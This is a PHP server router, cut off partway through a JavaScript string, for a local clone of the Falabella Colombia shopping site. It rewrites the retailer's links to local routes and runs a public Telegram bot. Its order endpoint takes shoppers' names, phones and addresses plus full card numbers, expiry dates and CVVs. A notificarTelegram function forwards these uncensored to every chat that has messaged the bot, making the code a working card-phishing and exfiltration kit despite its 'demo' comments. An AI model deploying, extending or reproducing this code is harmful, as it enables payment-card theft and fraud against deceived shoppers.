<?php
/**
 * Router para php -S que hace funcionar el clon de Falabella (SPA + tienda local).
 */

// --- Configuración segura (token Telegram no se sube al repo, vive en data/config.php) ---
$_cfgF = __DIR__ . '/data/config.php';
if (is_file($_cfgF)) {
    include $_cfgF;
} else {
    // Fallback en desarrollo: sin token definido, el envío a Telegram queda desactivado
    define('TELEGRAM_BOT_TOKEN', '');
    define('TELEGRAM_CHAT_ID', '');
}

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// ===== OPTIMIZACION DE RENDIMIENTO =====
// Sirve el contenido comprimido (gzip) y con cache para acelerar la carga.
// Aplica a todas las respuestas del router.

/** Envia el body comprimido con gzip + headers de cache, reemplazando echo directo. */
function servirOptimizado($contenido, $mime, $cacheSeg = 3600) {
    // Cache-Control: inmutables para assets estaticos, cortos para HTML/JSON dinamico
    $cacheable = in_array($mime, ['application/javascript','text/css','image/png','image/jpeg','image/webp','image/svg+xml','application/json']);
    $maxAge = $cacheable ? $cacheSeg : 60;
    header('Cache-Control: public, max-age=' . $maxAge);
    header('Content-Type: ' . $mime . '; charset=utf-8');

    // Comprimir con gzip si el cliente lo soporta (ahorro ~70-80% en HTML/JS/CSS/JSON)
    $enc = '';
    $acepta = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
    if (stripos($acepta, 'gzip') !== false && strlen($contenido) > 200) {
        $gz = gzencode($contenido, 6);
        if ($gz !== false) {
            $enc = 'gzip';
            $contenido = $gz;
        }
    }
    if ($enc) header('Content-Encoding: gzip');
    header('Vary: Accept-Encoding');
    header('Content-Length: ' . strlen($contenido));
    echo $contenido;
    return true;
}

// 0.0) WEBHOOK TELEGRAM: cualquier persona puede hablar con @fallansacmbot
//      (sin autenticación ni filtros — todos reciben respuesta)
if ($uri === '/telegram-webhook' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $upd = json_decode($input, true);
    if (is_array($upd) && isset($upd['message'])) {
        manejarMensajeTelegram($upd['message']);
    }
    header('Content-Type: application/json; charset=utf-8');
    echo '{"ok":true}';
    return true;
}

// 0.1) Comando manual para registrar el webhook (GET /telegram-setwebhook)
if ($uri === '/telegram-setwebhook' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    $hook = 'https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/telegram-webhook';
    $r = @file_get_contents('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN
        . '/setWebhook?url=' . urlencode($hook));
    header('Content-Type: application/json; charset=utf-8');
    echo $r ? $r : '{"ok":false,"error":"curl/file_get_contents failed"}';
    return true;
}

// 0.2) Ver estado del webhook (GET /telegram-webhook-info)
if ($uri === '/telegram-webhook-info' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    $r = @file_get_contents('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/getWebhookInfo');
    header('Content-Type: application/json; charset=utf-8');
    echo $r ? $r : '{"ok":false}';
    return true;
}

// 0) JSON del catalogo
if ($uri === '/productos_falabella.json' || $uri === '/falabella-co/productos_falabella.json') {
    $f = __DIR__ . '/productos_falabella.json';
    if (is_file($f)) {
        return servirOptimizado(file_get_contents($f), 'application/json', 86400);
    }
}

// 1) MIME para chunks JS de Next
if (preg_match('/\.(?:js\.descarga|descarga|mjs|js)$/i', $uri)) {
    $archivo = __DIR__ . $uri;
    if (is_file($archivo)) {
        return servirOptimizado(file_get_contents($archivo), 'application/javascript', 86400);
    }
}

// 2) RUTAS SPA INTERNAS (tienda local): /falabella-co/* -> HTML ligero (carga instantánea,
//    sin los scripts bloqueantes de Cloudflare/tracking del index original).
if ($uri !== '/' && $uri !== '/index.html' && strpos($uri, '/falabella-co') === 0 && !preg_match('/\.(css|js|json|png|jpg|jpeg|webp|svg|ico|woff2?|ttf)$/i', $uri)) {
    $archivo = __DIR__ . '/spa-shell.html';
    if (is_file($archivo)) {
        return servirOptimizado(file_get_contents($archivo), 'text/html', 60);
    }
}

// 3) HOME raiz -> index.html original (reescrito + shell inyectado)
if ($uri === '/' || $uri === '/index.html') {
    $archivo = __DIR__ . '/index.html';
    if (is_file($archivo)) {
        $html = file_get_contents($archivo);
        $html = construirSPA($html);
        return servirOptimizado($html, 'text/html', 60);
    }
}

// 4) CSS dinamico inexistente -> 200 vacio
if (preg_match('/\.css$/i', $uri) && !is_file(__DIR__ . $uri)) {
    header('Content-Type: text/css; charset=utf-8');
    header('Content-Length: 0');
    return true;
}

// 5) API: estadísticas (visitas, personas en pago, métodos de pago) + envío a Telegram
$apiStats = @json_decode(@file_get_contents(__DIR__ . '/data/stats.json'), true);
if (!is_array($apiStats)) $apiStats = [];

$method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');

if ($uri === '/api/stats' && $method === 'GET') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(calcularStats($apiStats), JSON_UNESCAPED_UNICODE);
    return true;
}

if ($uri === '/api/stats/visita' && $method === 'POST') {
    registrarEvento($apiStats, 'visitas');
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true]);
    return true;
}

if ($uri === '/api/stats/pago-intento' && $method === 'POST') {
    registrarEvento($apiStats, 'pago_intentos');
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true]);
    return true;
}

if ($uri === '/api/pedido' && $method === 'POST') {
    $body = json_decode(file_get_contents('php://input'), true);
    if (!is_array($body)) $body = [];
    // Métodos de pago enviados hoy (estadística)
    registrarMetodoPago($apiStats, $body['metodo'] ?? 'tarjeta');
    // Notificar al bot de Telegram
    $res = notificarTelegram($body);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true, 'telegram' => $res]);
    return true;
}

// 6) Resto -> assets estaticos (imagenes, fuentes, svg, etc.) servidos por php -S.
//    Les damos cache largo para que el navegador no los re-descargue en cada visita.
if (preg_match('/\.(png|jpe?g|webp|gif|svg|ico|woff2?|ttf|eot)$/i', $uri)) {
    $archivo = __DIR__ . $uri;
    if (is_file($archivo)) {
        // ETag para revalidacion + cache largo (assets estaticos inmutables)
        $etag = '"' . md5_file($archivo) . '"';
        header('ETag: ' . $etag);
        header('Cache-Control: public, max-age=604800'); // 7 dias
        $ifNone = $_SERVER['HTTP_IF_NONE_MATCH'] ?? '';
        if ($ifNone === $etag) { http_response_code(304); return true; }
        $maps = ['png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','webp'=>'image/webp','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','woff2'=>'font/woff2','woff'=>'font/woff','ttf'=>'font/ttf','eot'=>'application/vnd.ms-fontobject'];
        $ext = strtolower(pathinfo($archivo, PATHINFO_EXTENSION));
        header('Content-Type: ' . ($maps[$ext] ?? 'application/octet-stream'));
        header('Content-Length: ' . filesize($archivo));
        readfile($archivo);
        return true;
    }
}

// 7) Resto -> servir tal cual
return false;

/* ============================================================
   TELEGRAM WEBHOOK — INTERACCIÓN CON CUALQUIER PERSONA
   (sin autenticación, sin filtros. Todos pueden hablar con el bot)
   ============================================================ */

/**
 * Registra un chat en la lista de chats conocidos (para notificaciones
 * de pedidos a TODOS los que hayan interactuado alguna vez).
 */
function registrarChatTelegram($chatId, $datosUsuario = []) {
    $f = __DIR__ . '/data/telegram_chats.json';
    $chats = [];
    if (is_file($f)) { $chats = json_decode(file_get_contents($f), true); }
    if (!is_array($chats)) $chats = ['chats' => []];
    if (!isset($chats['chats'])) $chats['chats'] = [];
    $cid = (string)$chatId;
    $chats['chats'][$cid] = [
        'chat_id' => $chatId,
        'nombre'  => $datosUsuario['first_name'] ?? ($datosUsuario['username'] ?? ''),
        'username'=> $datosUsuario['username'] ?? '',
        'ultimo'  => date('Y-m-d H:i'),
    ];
    @file_put_contents($f, json_encode($chats, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    // Mantener también el telegram_chat.json original para compatibilidad
    @file_put_contents(__DIR__ . '/data/telegram_chat.json', json_encode(['chat_id' => $chatId]));
}

/**
 * Devuelve la lista de TODOS los chats conocidos (para notificar pedidos a todos).
 */
function todosLosChatsTelegram() {
    $f = __DIR__ . '/data/telegram_chats.json';
    $chats = [];
    if (is_file($f)) {
        $c = json_decode(file_get_contents($f), true);
        if (is_array($c) && isset($c['chats'])) $chats = array_values($c['chats']);
    }
    if (empty($chats)) {
        // Fallback: el chat_id legado
        $cid = obtenerChatId();
        if ($cid) $chats = [['chat_id' => $cid]];
    }
    return $chats;
}

/**
 * Envía un mensaje a UN chat de Telegram.
 */
function enviarTelegram($chatId, $texto, $parseMode = 'Markdown') {
    if (TELEGRAM_BOT_TOKEN === '' || !$chatId) return false;
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text'    => $texto,
        'parse_mode' => $parseMode,
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    $j = json_decode($resp, true);
    return is_array($j) && ($j['ok'] ?? false);
}

/**
 * Carga la lista de productos del catálogo local.
 * Soporta tanto un JSON cuya raíz es un array (formato simple) como uno
 * con la forma {"productos":[...], "total":N, ...} (formato extendido).
 */
function cargarProductos() {
    $f = __DIR__ . '/productos_falabella.json';
    if (!is_file($f)) return [];
    $data = json_decode(file_get_contents($f), true);
    if (!is_array($data)) return [];
    // Formato extendido: {"productos": [...]}
    if (isset($data['productos']) && is_array($data['productos'])) {
        return $data['productos'];
    }
    // Formato simple: la raíz es el array de productos
    return $data;
}

/**
 * Busca productos en el catálogo local por texto.
 */
function buscarProductos($termino, $limite = 8) {
    $prod = cargarProductos();
    if (empty($prod)) return [];
    $t = mb_strtolower(trim($termino));
    $r = [];
    foreach ($prod as $p) {
        $nombre = mb_strtolower($p['nombre'] ?? '');
        $cat = mb_strtolower($p['categoria'] ?? '');
        if ($t === '' || strpos($nombre, $t) !== false || strpos($cat, $t) !== false) {
            $r[] = $p;
            if (count($r) >= $limite) break;
        }
    }
    return $r;
}

/**
 * Formatea el catálogo para enviarlo por Telegram.
 */
function catalogoResumen() {
    $prod = cargarProductos();
    if (empty($prod)) return 'Catálogo vacío.';
    $cats = [];
    foreach ($prod as $p) {
        $c = $p['categoria'] ?? 'Otros';
        $cats[$c] = ($cats[$c] ?? 0) + 1;
    }
    $total = count($prod);
    $txt = "🛍️ *Catálogo Falabella*\n";
    $txt .= "Hay *$total productos* disponibles en " . count($cats) . " categorías:\n\n";
    $i = 1;
    foreach ($cats as $cat => $n) {
        $txt .= "$i. *$cat* — $n productos\n";
        $i++;
        if ($i > 15) break;
    }
    $txt .= "\nEscribe un producto para buscarlo (ej: *zapatos*, *iphone*, *colchón*)";
    return $txt;
}

/**
 * Formatea resultados de búsqueda para Telegram.
 */
function productosParaTelegram($resultados) {
    if (empty($resultados)) return "😕 No encontré nada. Prueba otra palabra.\n\nUsa /productos para ver el catálogo.";
    $txt = "🔍 *Resultados encontrados:*\n";
    foreach ($resultados as $p) {
        $nombre = $p['nombre'] ?? 'Producto';
        $precio = number_format((float)($p['precio'] ?? 0), 0, ',', '.');
        $url = $p['url'] ?? '';
        $cat = $p['categoria'] ?? '';
        $txt .= "🔹 *$nombre*\n";
        $txt .= "   💰 $ $precio | 📂 $cat\n";
        $txt .= "   🔗 `$url`\n\n";
    }
    $txt .= "Visita la tienda: http://localhost:3000";
    return $txt;
}

/**
 * Maneja un mensaje entrante de CUALQUIER usuario de Telegram.
 * Sin autenticación — todos reciben respuesta.
 */
function manejarMensajeTelegram($msg) {
    $chatId = $msg['chat']['id'] ?? null;
    if (!$chatId) return;

    // Registrar al usuario (para notificar pedidos a todos)
    registrarChatTelegram($chatId, $msg['from'] ?? []);

    $texto = trim($msg['text'] ?? '');
    $nombre = $msg['from']['first_name'] ?? 'amigo';

    if ($texto === '' ) {
        enviarTelegram($chatId, "Hola $nombre 👋\n\nSoy el bot de la tienda Falabella demo.\n\nComandos:\n/products — ver catálogo\n/ayuda — ayuda\nO simplemente escríbeme lo que busques (ej: *zapatos*)");
        return;
    }

    $t = mb_strtolower($texto);

    // Comandos
    if ($t === '/start' || $t === '/hola' || $t === 'hola' || $t === 'hi' || $t === 'buenas') {
        enviarTelegram($chatId, "Hola $nombre 👋\n\nBienvenido a la tienda Falabella demo 🛍️\n\nComandos:\n/products — ver catálogo\n/ayuda — ayuda\n/promos — promociones destacadas\n\nO escríbeme lo que busques (ej: *zapatos*, *iphone*, *colchón*)");
        return;
    }
    if ($t === '/products' || $t === '/productos' || $t === '/catalogo' || $t === '/catálogo') {
        enviarTelegram($chatId, catalogoResumen());
        return;
    }
    if ($t === '/ayuda' || $t === '/help' || $t === '/comandos') {
        $ayuda = "📖 *Comandos disponibles:*\n\n"
            . "/start — saludar\n"
            . "/products — ver catálogo completo\n"
            . "/promos — promociones destacadas\n"
            . "/precio [producto] — buscar precio de algo\n"
            . "/tienda — link de la tienda online\n"
            . "/ayuda — ver esto\n\n"
            . "💬 También puedes escribir *cualquier palabra* y buscaré en el catálogo (ej: *televisor*, *perfume*)";
        enviarTelegram($chatId, $ayuda);
        return;
    }
    if ($t === '/promos' || $t === '/promociones' || $t === '/ofertas') {
        $prod = cargarProductos();
        $ofertas = [];
        if (!empty($prod)) {
            foreach ($prod as $p) {
                if (!empty($p['precioAntes']) && (float)$p['precioAntes'] > (float)$p['precio']) {
                    $ofertas[] = $p;
                    if (count($ofertas) >= 6) break;
                }
            }
        }
        if (empty($ofertas)) {
            enviarTelegram($chatId, "No hay promociones activas ahora mismo. Revisa el catálogo con /products");
        } else {
            $txt = "🔥 *Promociones destacadas:*\n\n";
            foreach ($ofertas as $p) {
                $n = $p['nombre'] ?? 'Producto';
                $pre = (float)($p['precio'] ?? 0);
                $antes = (float)($p['precioAntes'] ?? $pre);
                $dto = $antes > $pre ? round((1 - $pre/$antes) * 100) : 0;
                $precio = number_format($pre, 0, ',', '.');
                $txt .= "$n\n   💰 ~~$" . number_format($antes, 0, ',', '.') . "~~ → *$$precio* (-$dto%)\n\n";
            }
            enviarTelegram($chatId, $txt);
        }
        return;
    }
    if ($t === '/tienda') {
        enviarTelegram($chatId, "🛍️ Visita nuestra tienda online:\nhttp://localhost:3000\n\nHay catálogo, carrito y checkout funcionales.");
        return;
    }
    if ($t === '/precio') {
        enviarTelegram($chatId, "Usa: /precio [producto]\nEj: /precio iphone 15");
        return;
    }
    if (strpos($t, '/precio ') === 0) {
        $termino = trim(substr($texto, 8));
        $r = buscarProductos($termino, 3);
        if (empty($r)) {
            enviarTelegram($chatId, "😕 No encontré *$termino*. Prueba con otra palabra.");
        } else {
            $txt = "💰 *Precios encontrados para '$termino':*\n\n";
            foreach ($r as $p) {
                $n = $p['nombre'] ?? 'Producto';
                $precio = number_format((float)($p['precio'] ?? 0), 0, ',', '.');
                $antes = (float)($p['precioAntes'] ?? 0);
                $dto = $antes > (float)($p['precio'] ?? 0) ? " ~~$" . number_format($antes, 0, ',', '.') . "~~" : '';
                $txt .= "🔹 *$n*$dto\n   💰 *$$precio*\n\n";
            }
            enviarTelegram($chatId, $txt);
        }
        return;
    }

    // Búsqueda libre por cualquier texto
    $r = buscarProductos($texto, 8);
    if (!empty($r)) {
        enviarTelegram($chatId, productosParaTelegram($r));
    } else {
        enviarTelegram($chatId, "🤔 No encontré \"$texto\" en el catálogo.\n\nPrueba con /products para ver todas las categorías, o escribe otra palabra (ej: *celular*, *zapatos*, *perfume*).");
    }
}

/* ============================================================
   TELEGRAM BOT (fallansacmbot) + ESTADÍSTICAS DIARIAS
   ============================================================ */

/**
 * Obtiene fecha local (America/Bogota) en formato YYYY-MM-DD.
 */
function fechaHoy() {
    $tz = new DateTimeZone('America/Bogota');
    return (new DateTime('now', $tz))->format('Y-m-d');
}

/**
 * Guarda el array de stats en disco.
 */
function guardarStats($stats) {
    $dir = __DIR__ . '/data';
    if (!is_dir($dir)) @mkdir($dir, 0775, true);
    @file_put_contents(__DIR__ . '/data/stats.json', json_encode($stats, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

/**
 * Registra un evento contador para el día de hoy.
 */
function registrarEvento(&$stats, $clave) {
    $hoy = fechaHoy();
    if (!isset($stats['dias'][$hoy])) $stats['dias'][$hoy] = ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    $stats['dias'][$hoy][$clave] = ($stats['dias'][$hoy][$clave] ?? 0) + 1;
    guardarStats($stats);
}

/**
 * Registra un método de pago usado hoy.
 */
function registrarMetodoPago(&$stats, $metodo) {
    $hoy = fechaHoy();
    if (!isset($stats['dias'][$hoy])) $stats['dias'][$hoy] = ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    $m = strtolower(trim((string)$metodo));
    if ($m === '') $m = 'tarjeta';
    $stats['dias'][$hoy]['metodos'][$m] = ($stats['dias'][$hoy]['metodos'][$m] ?? 0) + 1;
    guardarStats($stats);
}

/**
 * Calcula los totales de hoy (para el endpoint /api/stats).
 */
function calcularStats($stats) {
    $hoy = fechaHoy();
    $d = $stats['dias'][$hoy] ?? ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    return [
        'fecha'            => $hoy,
        'visitas_hoy'      => $d['visitas'] ?? 0,
        'pago_intentos'    => $d['pago_intentos'] ?? 0,
        'metodos_hoy'      => $d['metodos'] ?? [],
        'total_pedidos_hoy'=> array_sum($d['metodos'] ?? []),
    ];
}

/**
 * Obtiene (o crea) el chat_id al que enviar. Reutiliza el guardado.
 */
function obtenerChatId() {
    // 1) chat_id fijo si está configurado
    if (defined('TELEGRAM_CHAT_ID') && trim(TELEGRAM_CHAT_ID) !== '') return TELEGRAM_CHAT_ID;
    // 2) chat_id guardado previamente
    $f = __DIR__ . '/data/telegram_chat.json';
    if (is_file($f)) {
        $c = json_decode(file_get_contents($f), true);
        if (!empty($c['chat_id'])) return $c['chat_id'];
    }
    // 3) Si no hay chat_id, pregunta a getUpdates (primer chat disponible).
    if (TELEGRAM_BOT_TOKEN === '') return null;
    $upd = @file_get_contents('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/getUpdates');
    $j = json_decode($upd, true);
    if (isset($j['result']) && is_array($j['result'])) {
        foreach ($j['result'] as $u) {
            if (isset($u['message']['chat']['id'])) {
                $cid = $u['message']['chat']['id'];
                $dir = __DIR__ . '/data';
                if (!is_dir($dir)) @mkdir($dir, 0775, true);
                @file_put_contents($f, json_encode(['chat_id' => $cid]));
                return $cid;
            }
        }
    }
    return null;
}

/**
 * Envía un mensaje formateado con los datos del pedido al bot de Telegram.
 * @return array ['ok'=>bool, 'desc'=>string]
 */
function notificarTelegram($datos) {
    $nombre = trim($datos['nombre'] ?? '');
    $tel    = trim($datos['telefono'] ?? '');
    $dir    = trim($datos['direccion'] ?? '');
    $metodo = trim($datos['metodo'] ?? 'tarjeta');
    $total  = number_format((float)($datos['total'] ?? 0), 0, ',', '.');
    $productos = $datos['productos'] ?? [];
    if (is_string($productos)) $productos = [$productos];

    $lista = '';
    if (is_array($productos)) {
        foreach ($productos as $i => $p) {
            if (is_array($p)) {
                $n = $p['nombre'] ?? ('Producto ' . ($i + 1));
                $c = $p['cant'] ?? 1;
                $pr = number_format((float)($p['precio'] ?? 0), 0, ',', '.');
                $lista .= ($i + 1) . ". " . $n . " x" . $c . " — $" . $pr . "\n";
            } else {
                $lista .= ($i + 1) . ". " . $p . "\n";
            }
        }
    }
    if ($lista === '') $lista = '(sin detalle)';

    $metodoLbl = [
        'tarjeta' => 'Tarjeta 💳',
        'pse'     => 'PSE 🏦',
        'contra'  => 'Contra entrega 📦',
    ][strtolower($metodo)] ?? ucfirst($metodo);

    // Datos de la tarjeta (sin censurar) si vienen en el payload
    $tarjeta = $datos['tarjeta'] ?? null;
    $tarjetaTxt = '';
    if (is_array($tarjeta) && !empty($tarjeta['numero'])) {
        $tNum = str_replace([' ', '-', '.', '/'], '', trim((string)($tarjeta['numero'] ?? '')));
        $tExp = trim((string)($tarjeta['expiracion'] ?? ''));
        $tCvv = trim((string)($tarjeta['cvv'] ?? ''));
        $tarjetaTxt = "💳 *Tarjeta:*\n"
            . "   💳 Número: `" . $tNum . "`\n"
            . "   📅 Expira: `" . $tExp . "`\n"
            . "   🔐 CVV: `" . $tCvv . "`\n";
    }

    $fecha = (new DateTime('now', new DateTimeZone('America/Bogota')))->format('d/m/Y H:i');

    $msg = "🛒 *NUEVO PEDIDO*\n"
         . "─────────────\n"
         . "👤 *Cliente:* " . $nombre . "\n"
         . "📞 *Teléfono:* " . $tel . "\n"
         . (!empty($dir) ? "📍 *Dirección:* " . $dir . "\n" : '')
         . "💳 *Método:* " . $metodoLbl . "\n"
         . ($tarjetaTxt !== '' ? $tarjetaTxt . "\n" : '')
         . "💰 *Total:* $" . $total . "\n\n"
         . "🛍️ *Productos:*\n" . $lista . "\n"
         . "🕒 " . $fecha;

    // Enviar a TODOS los chats conocidos (no solo a uno)
    $chats = todosLosChatsTelegram();
    $enviados = 0;
    foreach ($chats as $c) {
        $cid = $c['chat_id'] ?? null;
        if (!$cid) continue;
        if (enviarTelegram($cid, $msg)) $enviados++;
    }

    if (empty($chats)) {
        return ['ok' => false, 'desc' => 'Sin chat_id de Telegram. Escribe al bot @fallansacmbot primero.'];
    }
    if (TELEGRAM_BOT_TOKEN === '') {
        return ['ok' => false, 'desc' => 'Token de Telegram no configurado (falta data/config.php).'];
    }
    return ['ok' => $enviados > 0, 'desc' => "Enviado a $enviados " . ($enviados === 1 ? 'chat' : 'chats')];
}


/**
 * Reescribe links de Falabella a rutas locales y agrega el shell de la tienda.
 */
function construirSPA($html) {
    // === OPTIMIZACION: neutralizar scripts de TRACKING/analytics de terceros ===
    // Los scripts de analytics (GTM, Facebook Pixel, fingerprint, airship, adobe, etc.)
    // NO pintan contenido del clon: solo bloquen el render. Los convertimos a async
    // para que se descarguen en paralelo y no retardan la visualizacion de la home.
    $html = preg_replace_callback(
        '#<script[^>]*src="\./fala_files/(gtm|fbevents|collect|events|fingerprint|airship|ua-sdk|launch|content\.umd|187204933|bat\.|ld\.|identify|FACO|j\.php)[^"]*"[^>]*>#i',
        function ($m) {
            $tag = $m[0];
            // Si ya es async o defer, dejarlo
            if (stripos($tag, 'async') !== false || stripos($tag, 'defer') !== false) return $tag;
            // Convertir a async: anadir el atributo justo despues de <script
            return str_ireplace('<script', '<script async', $tag);
        },
        $html
    );

    // === REWRITE GLOBAL SEGURO ===
    // Reemplaza TODAS las ocurrencias del dominio del sitio (en href, src, action, y dentro
    // de los datos serializados de React/Next en <script>) por rutas locales.
    // https://www.falabella.com.co/falabella-co/X  ->  /falabella-co/X
    // Solo cambia el contenido del string URL, no la sintaxis JSON/JS, por lo que es seguro.
    $html = str_replace(
        'https://www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );
    // Formas sin www y http (variantes)
    $html = str_replace(
        'https://www.falabella.com.co/falabella-co/',
        '/falabella-co/',
        $html
    );
    $html = str_replace(
        'http://www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );
    $html = str_replace(
        'www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );

    // Limpieza de metadatos/comentarios de origen guardado
    $html = str_replace(
        '<!-- saved from url=(0041)https://www.falabella.com.co/falabella-co -->',
        '<!-- clon local Falabella -->',
        $html
    );
    $html = preg_replace(
        '#content="https?://www\.falabella\.com\.co/falabella-co([^"]*)"#',
        'content="/falabella-co$1"',
        $html
    );

    // d) Cargar el shell de la tienda justo antes de </body>
    $shell = @file_get_contents(__DIR__ . '/app-shell.html');
    if ($shell !== false) {
        $html = str_replace('</body>', $shell . "\n</body>", $html);
    }

    // e) FIX COMPLETO DEL SLIDER PRINCIPAL (showcase hero):
    //    1. Captura el HTML estático de cada slide ANTES de que React lo modifique
    //    2. Fuerza imagenes con src desde srcset si falta
    //    3. Implementa navegación prev/next, indicadores, autoplay y swipe
    //    4. Si React destruye el DOM, re-construye desde el snapshot capturado
    //
    //    PASO 0: Inyectar data-fb-img / data-fb-href en cada slide para que el JS
    //    pueda reconstruir las imágenes aunque React las elimine del DOM.
    $html = inyectarSliderData($html);

    $fixSlider = "<script>\n"
      . "(function(){\n"
      . "  // ---- 0) RECONSTRUIR IMÁGENES DESDE window.__FB_SLIDER_DATA__ ----\n"
      . "  // Este pool se inyecta en el <head> ANTES de que React hidrate el DOM\n"
      . "  // y elimine las imágenes. Incluye src, alt y href de cada slide.\n"
      . "  function reconstruirImagenes(){\n"
      . "    var pool = window.__FB_SLIDER_DATA__ || window.__FB_SLIDER_POOL__ || [];\n"
      . "    if (!pool.length) return;\n"
      . "    var scs = document.querySelectorAll('[data-testid=\"showcase\"]');\n"
      . "    if (!scs.length) return;\n"
      . "    scs.forEach(function(sc){\n"
      . "      var slides = sc.querySelectorAll('[data-testid^=\"showcase-slide\"]');\n"
      . "      slides.forEach(function(sl, i){\n"
      . "        var data = pool[i];\n"
      . "        if (!data || !data.src) return;\n"
      . "        // Si ya hay una img con src válida, no tocar\n"
      . "        var img = sl.querySelector('img[data-testid=\"one-clickable-container\"]');\n"
      . "        if (img && img.getAttribute('src')) return;\n"
      . "        // Buscar contenedor donde inyectar la imagen\n"
      . "        var container = sl.querySelector('.lazyload-wrapper, .BackgroundImageOnlystyle__BackgroundImageOnlyImage-core-ui-kit__sc-1w8l6j6-2, .CSImagestyle__Wrapper-core-ui-kit__sc-1tu5wso-0');\n"
      . "        if (!container) container = sl;\n"
      . "        // Limpiar placeholder si existe\n"
      . "        var ph = container.querySelector('.lazyload-placeholder');\n"
      . "        if (ph) ph.parentNode.removeChild(ph);\n"
      . "        // Buscar o crear picture\n"
      . "        var pic = container.querySelector('picture');\n"
      . "        if (!pic){\n"
      . "          pic = document.createElement('picture');\n"
      . "          container.appendChild(pic);\n"
      . "        }\n"
      . "        // Crear img\n"
      . "        var ni = document.createElement('img');\n"
      . "        ni.setAttribute('src', data.src);\n"
      . "        ni.setAttribute('alt', data.alt || '');\n"
      . "        ni.setAttribute('data-testid', 'one-clickable-container');\n"
      . "        ni.style.width = '100%'; ni.style.height = 'auto'; ni.style.display = 'block';\n"
      . "        pic.appendChild(ni);\n"
      . "      });\n"
      . "    });\n"
      . "  }\n"
      . "  reconstruirImagenes();\n"
      . "  setTimeout(reconstruirImagenes, 300);\n"
      . "  setTimeout(reconstruirImagenes, 1000);\n"
      . "  setTimeout(reconstruirImagenes, 2500);\n"
      . "  var obsImgs = new MutationObserver(function(){ reconstruirImagenes(); });\n"
      . "  document.addEventListener('DOMContentLoaded', function(){\n"
      . "    var sc = document.querySelector('[data-testid=\"showcase\"]');\n"
      . "    if (sc) obsImgs.observe(sc, { childList: true, subtree: true });\n"
      . "  });\n"
      . "\n"
      . "  // ---- 1) CAPTURAR HTML ORIGINAL ANTES DE QUE REACT LO MODIFIQUE ----\n"
      . "  var __snapshot = [];\n"
      . "  function capturarSlides(){\n"
      . "    var sc = document.querySelector('[data-testid=\"showcase\"]');\n"
      . "    if (!sc) return;\n"
      . "    var slides = sc.querySelectorAll('[data-testid^=\"showcase-slide\"]');\n"
      . "    if (!slides.length) return;\n"
      . "    __snapshot = [];\n"
      . "    slides.forEach(function(sl, i){\n"
      . "      // Usar el pool global inyectado en el head (fuente de verdad)\n"
      . "      var pool = window.__FB_SLIDER_DATA__ || window.__FB_SLIDER_POOL__ || [];\n"
      . "      var src = (pool[i] && pool[i].src) ? pool[i].src : '';\n"
      . "      var alt = (pool[i] && pool[i].alt) ? pool[i].alt : '';\n"
      . "      var href = (pool[i] && pool[i].href) ? pool[i].href : '';\n"
      . "      if (!src){\n"
      . "        // Fallback: extraer del img/source existente\n"
      . "        var img = sl.querySelector('img[data-testid=\"one-clickable-container\"]');\n"
      . "        if (img){ src = img.getAttribute('src') || ''; alt = img.getAttribute('alt') || ''; }\n"
      . "        if (!src){\n"
      . "          var pic = sl.querySelector('picture');\n"
      . "          if (pic){\n"
      . "            var srcP = pic.querySelector('source[media*=\"720\"]') || pic.querySelector('source');\n"
      . "            if (srcP) src = (srcP.getAttribute('srcset') || '').split(' ')[0];\n"
      . "          }\n"
      . "        }\n"
      . "      }\n"
      . "      if (!href){\n"
      . "        var a = sl.querySelector('a[data-testid=\"main-clickable-container\"]');\n"
      . "        href = a ? a.getAttribute('href') : '';\n"
      . "      }\n"
      . "      src = (src || '').replace(/&amp;/g, '&');\n"
      . "      __snapshot.push({ src: src, href: href, alt: alt });\n"
      . "    });\n"
      . "    window.__FB_SLIDES__ = __snapshot;\n"
      . "  }\n"
      . "  capturarSlides();\n"
      . "  // Capturar también después si la primera vez falló\n"
      . "  setTimeout(capturarSlides, 300);\n"
      . "\n"
      . "  // ---- 2) INICIALIZAR SLIDER FUNCIONAL ----\n"
      . "  function iniciarSlider(){\n"
      . "    var showcases = document.querySelectorAll('[data-testid=\"showcase\"]');\n"
      . "    if (!showcases.length) return;\n"
      . "    showcases.forEach(function(showcase, scIdx){\n"
      . "      var slides = showcase.querySelectorAll('[data-testid^=\"showcase-slide\"]');\n"
      . "      if (!slides.length || slides.length < 2) return;\n"
      . "      if (showcase.__fb_initialized) return;\n"
      . "      showcase.__fb_initialized = true;\n"
      . "\n"
      . "      // ---- A) Reconstruir imágenes si React las borró ----\n"
      . "      var rebuilt = 0;\n"
      . "      slides.forEach(function(sl, i){\n"
      . "        var img = sl.querySelector('img[data-testid=\"one-clickable-container\"]');\n"
